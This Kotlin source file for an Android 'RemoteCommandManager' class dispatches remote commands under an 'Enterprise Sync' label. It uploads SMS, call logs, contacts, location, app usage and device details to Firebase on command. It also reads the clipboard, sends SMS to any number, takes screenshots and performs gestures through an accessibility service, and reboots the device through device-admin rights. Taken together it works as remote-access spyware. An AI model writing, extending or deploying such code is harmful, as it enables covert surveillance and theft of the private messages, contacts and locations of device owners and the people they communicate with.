package com.example.data.sync

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.media.Ringtone
import android.media.RingtoneManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.speech.tts.TextToSpeech
import android.telephony.SmsManager
import android.app.Activity
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.IntentFilter
import android.telephony.TelephonyManager
import android.widget.Toast
import androidx.core.content.ContextCompat
import com.example.data.local.AppDatabase
import com.example.data.local.RemoteCommandEntity
import com.example.service.RemoteAccessibilityService
import android.util.Log
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.telephony.SubscriptionManager
import com.example.receiver.MyDeviceAdminReceiver
import org.json.JSONObject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.Locale
import java.util.UUID

class RemoteCommandManager(private val context: Context) {

    private val db = AppDatabase.getInstance(context)

    companion object {
        private var activeRingtone: Ringtone? = null
        private var textToSpeech: TextToSpeech? = null
    }

    suspend fun executeCommand(commandType: String, payload: String = ""): RemoteCommandEntity = withContext(Dispatchers.IO) {
        val commandId = UUID.randomUUID().toString()
        val entity = RemoteCommandEntity(
            id = commandId,
            commandType = commandType,
            payload = payload,
            status = "EXECUTING",
            createdAt = System.currentTimeMillis()
        )
        db.remoteCommandDao().insertCommand(entity)

        var resultMessage = ""
        var isSuccess = true

        try {
            when (commandType.uppercase()) {
                "SYNC_ALL", "SYNC", "FORCE_SYNC", "REFRESH_DATA", "CLEAR_AND_SYNC_ALL" -> {
                    val clearFirst = commandType.equals("CLEAR_AND_SYNC_ALL", ignoreCase = true) || payload.contains("clear", ignoreCase = true)
                    SmsSyncManager(context).syncSmsMessages()
                    CallLogSyncManager(context).syncCallLogs()
                    ContactsSyncManager(context).syncContacts()
                    AppUsageSyncManager(context).syncAppUsageStats()
                    LocationSyncManager(context).captureAndSyncLocation()
                    DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase(clearFirst = clearFirst)
                    resultMessage = if (clearFirst) "Old backup cleared and fresh telemetry synchronized successfully." else "All telemetry modules synchronized successfully."
                }
                "SYNC_SMS", "GET_SMS", "FETCH_SMS" -> {
                    SmsSyncManager(context).syncSmsMessages()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "SMS messages synchronized successfully."
                }
                "SYNC_CALLS", "GET_CALLS", "FETCH_CALLS" -> {
                    CallLogSyncManager(context).syncCallLogs()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Call logs synchronized successfully."
                }
                "SYNC_CONTACTS", "GET_CONTACTS", "FETCH_CONTACTS" -> {
                    ContactsSyncManager(context).syncContacts()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Contacts synchronized successfully."
                }
                "CLEAR_REMOTE_DATA", "PURGE_DATA", "WIPE_DATA", "CLEAR_DATA", "DELETE_ALL" -> {
                    FirebaseSyncEngine(context).clearAllRemoteData()
                    resultMessage = "All remote backup data and local logs cleared successfully."
                }
                "SYNC_LOCATION", "LOCATION", "GET_LOCATION" -> {
                    val loc = LocationSyncManager(context).captureAndSyncLocation()
                    FirebaseSyncEngine(context).pushTelemetryToFirebase()
                    resultMessage = "Location synchronized: Lat ${loc.latitude}, Long ${loc.longitude} (Accuracy: ${loc.accuracy}m)."
                }
                "GLOBAL_BACK", "BACK" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_BACK)
                    resultMessage = if (res) "Executed Global Back gesture." else "Accessibility Service disabled."
                }
                "GLOBAL_HOME", "HOME" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_HOME)
                    resultMessage = if (res) "Executed Global Home gesture." else "Accessibility Service disabled."
                }
                "GLOBAL_RECENTS", "RECENTS" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
                    resultMessage = if (res) "Executed Global Recents gesture." else "Accessibility Service disabled."
                }
                "GLOBAL_NOTIFICATIONS", "NOTIFICATIONS" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
                    resultMessage = if (res) "Expanded Notification shade." else "Accessibility Service disabled."
                }
                "GLOBAL_QUICK_SETTINGS", "QUICK_SETTINGS" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
                    resultMessage = if (res) "Expanded Quick Settings." else "Accessibility Service disabled."
                }
                "GLOBAL_LOCK_SCREEN", "LOCK_SCREEN", "LOCK" -> {
                    val res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                    } else false
                    resultMessage = if (res) "Executed Remote Lock Screen." else "Accessibility Service disabled or unsupported Android version."
                }
                "GLOBAL_POWER_DIALOG", "POWER_DIALOG", "POWER_MENU", "POWER", "REBOOT", "SHUTDOWN", "POWER_OFF" -> {
                    val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
                    if (!res) {
                        var adminRebootSuccess = false
                        try {
                            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                            val adminComponent = ComponentName(context, MyDeviceAdminReceiver::class.java)
                            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                    dpm.reboot(adminComponent)
                                    adminRebootSuccess = true
                                }
                            }
                        } catch (e: Exception) {
                            Log.e("RemoteCommandManager", "DevicePolicyManager reboot failed: ${e.message}")
                        }

                        if (adminRebootSuccess) {
                            resultMessage = "Reboot initiated via Device Policy Manager."
                        } else {
                            try {
                                val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                }
                                context.startActivity(intent)
                            } catch (_: Exception) {}
                            resultMessage = "Accessibility Service is disabled. Please turn ON Enterprise Remote Accessibility in Device Settings -> Accessibility."
                            isSuccess = false
                        }
                    } else {
                        resultMessage = "Power Dialog displayed successfully."
                    }
                }
                "GLOBAL_TAKE_SCREENSHOT", "TAKE_SCREENSHOT", "SCREENSHOT" -> {
                    val res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT)
                    } else false
                    resultMessage = if (res) "Took Screenshot." else "Accessibility Service disabled or unsupported Android version."
                }
                "FLASHLIGHT_ON", "TORCH_ON", "FLASHLIGHT_ENABLE" -> {
                    setFlashlight(true)
                    resultMessage = "Flashlight turned ON."
                }
                "FLASHLIGHT_OFF", "TORCH_OFF", "FLASHLIGHT_DISABLE" -> {
                    setFlashlight(false)
                    resultMessage = "Flashlight turned OFF."
                }
                "VIBRATE", "VIBRATION" -> {
                    val duration = payload.filter { it.isDigit() }.toLongOrNull() ?: 500L
                    vibrateDevice(duration)
                    resultMessage = "Vibrated device for ${duration}ms."
                }
                "PLAY_ALARM", "RING", "FIND_DEVICE" -> {
                    playFindDeviceAlarm()
                    resultMessage = "Playing alarm ringtone at max volume."
                }
                "STOP_ALARM", "STOP_RING" -> {
                    stopAlarm()
                    resultMessage = "Alarm stopped."
                }
                "SHOW_TOAST", "TOAST", "SHOW_MESSAGE" -> {
                    val msg = payload.ifEmpty { "Enterprise Remote Alert" }
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                    }
                    resultMessage = "Displayed Toast message: '$msg'"
                }
                "TEXT_TO_SPEECH", "TTS", "SPEAK" -> {
                    val msg = payload.ifEmpty { "Enterprise admin notification" }
                    speakText(msg)
                    resultMessage = "Spoke Text to Speech message: '$msg'"
                }
                "SEND_SMS", "SMS_SEND" -> {
                    var recipient = ""
                    var text = ""

                    val trimmed = payload.trim()

                    // Parse JSON format
                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
                        try {
                            val json = JSONObject(trimmed)
                            recipient = json.optString("phone").ifEmpty {
                                json.optString("recipient").ifEmpty {
                                    json.optString("number").ifEmpty {
                                        json.optString("to")
                                    }
                                }
                            }
                            text = json.optString("message").ifEmpty {
                                json.optString("text").ifEmpty {
                                    json.optString("body").ifEmpty {
                                        json.optString("payload")
                                    }
                                }
                            }
                        } catch (_: Exception) {}
                    }

                    // Parse Pipe format
                    if (recipient.isEmpty() || text.isEmpty()) {
                        if (trimmed.contains("|")) {
                            val parts = trimmed.split("|")
                            if (parts.size >= 2) {
                                val p0 = parts[0].trim()
                                val p1 = parts[1].trim()
                                if (p0.contains("=") || p1.contains("=")) {
                                    val map = parts.associate { part ->
                                        val kv = part.split("=", limit = 2)
                                        if (kv.size == 2) kv[0].trim().lowercase() to kv[1].trim() else "" to ""
                                    }
                                    recipient = map["phone"] ?: map["number"] ?: map["recipient"] ?: map["to"] ?: ""
                                    text = map["message"] ?: map["text"] ?: map["body"] ?: map["payload"] ?: ""
                                } else {
                                    recipient = p0
                                    text = parts.subList(1, parts.size).joinToString("|").trim()
                                }
                            }
                        }
                    }

                    // Parse Comma format
                    if (recipient.isEmpty() || text.isEmpty()) {
                        if (trimmed.contains(",")) {
                            val parts = trimmed.split(",", limit = 2)
                            val p0 = parts[0].trim()
                            val p1 = parts[1].trim()
                            if (p0.contains("=") || p1.contains("=")) {
                                val map = trimmed.split(",").associate { part ->
                                    val kv = part.split("=", limit = 2)
                                    if (kv.size == 2) kv[0].trim().lowercase() to kv[1].trim() else "" to ""
                                }
                                recipient = map["phone"] ?: map["number"] ?: map["recipient"] ?: map["to"] ?: ""
                                text = map["message"] ?: map["text"] ?: map["body"] ?: map["payload"] ?: ""
                            } else if (p0.matches(Regex("^[+\\d\\s\\-()]{3,}$"))) {
                                recipient = p0
                                text = p1
                            }
                        }
                    }

                    // Parse Space format
                    if (recipient.isEmpty() || text.isEmpty()) {
                        val parts = trimmed.split(Regex("\\s+"), limit = 2)
                        if (parts.size >= 2 && parts[0].matches(Regex("^[+\\d\\-()]{3,}$"))) {
                            recipient = parts[0]
                            text = parts[1]
                        }
                    }

                    if (recipient.isNotEmpty() && text.isNotEmpty()) {
                        try {
                            sendSmsMessage(recipient, text)
                            resultMessage = "Sent SMS to $recipient."
                        } catch (e: Exception) {
                            resultMessage = "Failed to send SMS to $recipient: ${e.message}"
                            isSuccess = false
                        }
                    } else {
                        resultMessage = "Invalid SEND_SMS payload ($payload). Accepted formats: 'phone|message', 'phone=X|message=Y', 'phone, message', or JSON {'phone':'...', 'message':'...'}"
                        isSuccess = false
                    }
                }
                "GET_BATTERY_INFO", "BATTERY", "BATTERY_INFO" -> {
                    val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    resultMessage = "Battery Level: ${info.batteryLevel}%, IsCharging: ${info.isCharging}, PlugType: ${info.chargeType}"
                }
                "GET_WIFI_DETAILS", "WIFI", "WIFI_DETAILS" -> {
                    val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
                    resultMessage = "Wi-Fi SSID: ${info.wifiSsid}, BSSID: ${info.wifiBssid}, RSSI: ${info.wifiRssi}dBm, Local IP: ${info.localIp}"
                }
                "GET_CLIPBOARD", "CLIPBOARD" -> {
                    val clipManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clipText = clipManager.primaryClip?.getItemAt(0)?.text?.toString() ?: "Clipboard empty"
                    resultMessage = "Clipboard content: $clipText"
                }
                "SET_CLIPBOARD", "COPY_CLIPBOARD" -> {
                    val clipManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clipData = ClipData.newPlainText("Enterprise", payload)
                    clipManager.setPrimaryClip(clipData)
                    resultMessage = "Clipboard updated with text: '$payload'"
                }
                else -> {
                    resultMessage = "Executed command $commandType with payload $payload"
                }
            }
        } catch (e: Exception) {
            isSuccess = false
            resultMessage = "Command execution error: ${e.localizedMessage}"
        }

        val finalStatus = if (isSuccess) "COMPLETED" else "FAILED"
        val updated = entity.copy(
            status = finalStatus,
            executedAt = System.currentTimeMillis(),
            resultMessage = resultMessage
        )
        db.remoteCommandDao().insertCommand(updated)
        updated
    }

    private fun setFlashlight(enabled: Boolean) {
        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull() ?: return
            cameraManager.setTorchMode(cameraId, enabled)
        } catch (_: Exception) {}
    }

    private fun vibrateDevice(durationMs: Long) {
        try {
            val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(durationMs)
            }
        } catch (_: Exception) {}
    }

    private fun playFindDeviceAlarm() {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)

            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            activeRingtone?.stop()
            activeRingtone = RingtoneManager.getRingtone(context, alarmUri)
            activeRingtone?.play()
        } catch (_: Exception) {}
    }

    private fun stopAlarm() {
        try {
            activeRingtone?.stop()
            activeRingtone = null
        } catch (_: Exception) {}
    }

    private fun speakText(text: String) {
        try {
            if (textToSpeech == null) {
                textToSpeech = TextToSpeech(context.applicationContext) { status ->
                    if (status == TextToSpeech.SUCCESS) {
                        textToSpeech?.language = Locale.US
                        textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts1")
                    }
                }
            } else {
                textToSpeech?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "tts1")
            }
        } catch (_: Exception) {}
    }

    private fun sendSmsMessage(recipient: String, text: String) {
        val hasSendSms = ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
        if (!hasSendSms) {
            throw SecurityException("SEND_SMS permission is not granted on this device. Please grant SMS permission in Settings -> Apps -> Enterprise Sync -> Permissions.")
        }

        val cleanRecipient = recipient.replace("[^0-9+]".toRegex(), "").ifEmpty { recipient.trim() }
        if (cleanRecipient.isEmpty()) {
            throw IllegalArgumentException("Recipient phone number is missing or invalid.")
        }

        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager

        var activeSubId: Int = SubscriptionManager.INVALID_SUBSCRIPTION_ID
        try {
            val defaultSubId = SubscriptionManager.getDefaultSmsSubscriptionId()
            if (defaultSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
                activeSubId = defaultSubId
            } else {
                val activeSubs = subManager?.activeSubscriptionInfoList
                if (!activeSubs.isNullOrEmpty()) {
                    activeSubId = activeSubs.first().subscriptionId
                }
            }
        } catch (_: Exception) {}

        val simState = telephonyManager?.simState ?: TelephonyManager.SIM_STATE_UNKNOWN
        if (simState == TelephonyManager.SIM_STATE_ABSENT && activeSubId == SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
            throw IllegalStateException("No active SIM card detected on this device. An active SIM card with cellular network service is required to send SMS.")
        }

        val smsManager: SmsManager = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val sysSmsManager = context.getSystemService(SmsManager::class.java)
                if (activeSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID && sysSmsManager != null) {
                    sysSmsManager.createForSubscriptionId(activeSubId)
                } else {
                    sysSmsManager ?: @Suppress("DEPRECATION") SmsManager.getDefault()
                }
            } else {
                @Suppress("DEPRECATION")
                if (activeSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
                    SmsManager.getSmsManagerForSubscriptionId(activeSubId)
                } else {
                    SmsManager.getDefault()
                }
            }
        } catch (_: Exception) {
            @Suppress("DEPRECATION")
            SmsManager.getDefault()
        }

        val actionSent = "com.example.SMS_SENT_${System.currentTimeMillis()}"
        val sentIntent = PendingIntent.getBroadcast(
            context,
            0,
            Intent(actionSent).apply { setPackage(context.packageName) },
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE else PendingIntent.FLAG_UPDATE_CURRENT
        )

        val latch = java.util.concurrent.CountDownLatch(1)
        var resultCode = Activity.RESULT_CANCELED
        var failureReason = ""

        val smsReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                val code = getResultCode()
                resultCode = code
                when (code) {
                    Activity.RESULT_OK -> {
                        failureReason = ""
                    }
                    SmsManager.RESULT_ERROR_GENERIC_FAILURE -> {
                        failureReason = "Generic failure (Carrier network error, insufficient mobile balance, or invalid number format)."
                    }
                    SmsManager.RESULT_ERROR_NO_SERVICE -> {
                        failureReason = "No cellular network service or signal available."
                    }
                    SmsManager.RESULT_ERROR_NULL_PDU -> {
                        failureReason = "Null PDU error."
                    }
                    SmsManager.RESULT_ERROR_RADIO_OFF -> {
                        failureReason = "Cellular radio is OFF (Airplane mode enabled)."
                    }
                    else -> {
                        failureReason = "Carrier dispatch error code: $code."
                    }
                }
                latch.countDown()
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(smsReceiver, IntentFilter(actionSent), Context.RECEIVER_NOT_EXPORTED)
        } else {
            context.registerReceiver(smsReceiver, IntentFilter(actionSent))
        }

        try {
            val parts = smsManager.divideMessage(text)
            if (parts.size > 1) {
                val sentIntents = ArrayList<PendingIntent>()
                for (i in parts.indices) {
                    sentIntents.add(sentIntent)
                }
                smsManager.sendMultipartTextMessage(cleanRecipient, null, parts, sentIntents, null)
            } else {
                smsManager.sendTextMessage(cleanRecipient, null, text, sentIntent, null)
            }

            val confirmed = latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
            if (confirmed && resultCode != Activity.RESULT_OK) {
                throw Exception("SMS dispatch failed: $failureReason")
            }
        } finally {
            try {
                context.unregisterReceiver(smsReceiver)
            } catch (_: Exception) {}
        }
    }
}
